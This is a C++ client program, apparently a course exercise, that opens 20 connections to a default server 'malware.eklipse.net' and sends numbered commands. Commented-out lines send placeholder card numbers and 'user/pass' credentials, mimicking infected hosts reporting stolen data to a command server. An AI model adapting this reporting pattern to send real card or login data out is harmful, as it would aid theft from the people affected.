/**
 * @file main.cpp
 * @author Sean Evans
 * @date 2014-10-10
 */

#include <stdlib.h>
#include <boost/asio.hpp>
#include <boost/mem_fn.hpp>
#include <boost/program_options.hpp>
#include <boost/thread.hpp>
#include <boost/ptr_container/ptr_container.hpp>
#include "client.hpp"
#include "client_config.hpp"
#include "command.hpp"

static const char* sHelpString = "help";
static const char* sHostString = "host_name";
static const char* sServiceString = "service_name";

/**
 * @brief Program entry point
 */
int main( int argc, const char* argv[] )
{
    boost::program_options::options_description options;

    options.add_options()
        ( sHelpString, "Print help" )
        ( sHostString, boost::program_options::value<std::string>()->default_value( "malware.eklipse.net" ), "Server host name" )
        ( sServiceString, boost::program_options::value<std::string>()->default_value( "9001" ), "Server port number or service name" );

    boost::program_options::variables_map vm;

    boost::program_options::store(
        boost::program_options::parse_command_line( argc, argv, options ), vm );

    boost::program_options::notify( vm );

    if ( vm.count( sHelpString ) ) {
        options.print( std::cout );
        return EXIT_SUCCESS;
    }

    boost::asio::io_service io_service;

    hw::client_config config( vm[sHostString].as<std::string>(), vm[sServiceString].as<std::string>() );

    boost::asio::ip::tcp::resolver::query query( config.getHostName(), config.getServiceName() );
    boost::asio::ip::tcp::resolver resolver( io_service );
    boost::asio::ip::tcp::resolver::iterator it = resolver.resolve( query );

    boost::ptr_vector<hw::client> clients;

    for ( int i = 0; i < 20; i++ ) {
        clients.push_back( new hw::client( io_service, config, it->endpoint(), hw::command( i, 1, "" ) ) );
    }

    /* clients.push_back( new hw::client( io_service, config, it->endpoint(), hw::command( 1, 1, "" ) ) ); */
    /* clients.push_back( new hw::client( io_service, config, it->endpoint(), hw::command( 1, 2, "1111-1111-1111-1111" ) ) ); */
    /* clients.push_back( new hw::client( io_service, config, it->endpoint(), hw::command( 1, 3, "user/pass" ) ) ); */
    /* clients.push_back( new hw::client( io_service, config, it->endpoint(), hw::command( 1, 5, "???" ) ) ); */

    unsigned int threadCount = boost::thread::hardware_concurrency();
    boost::thread_group threads;

    for ( unsigned int i = 0; i <= threadCount; i++ ) {
        threads.add_thread( new boost::thread( boost::bind( &boost::asio::io_service::run, &io_service ) ) );
    }

    io_service.run();

    threads.join_all();

    return EXIT_SUCCESS;
}

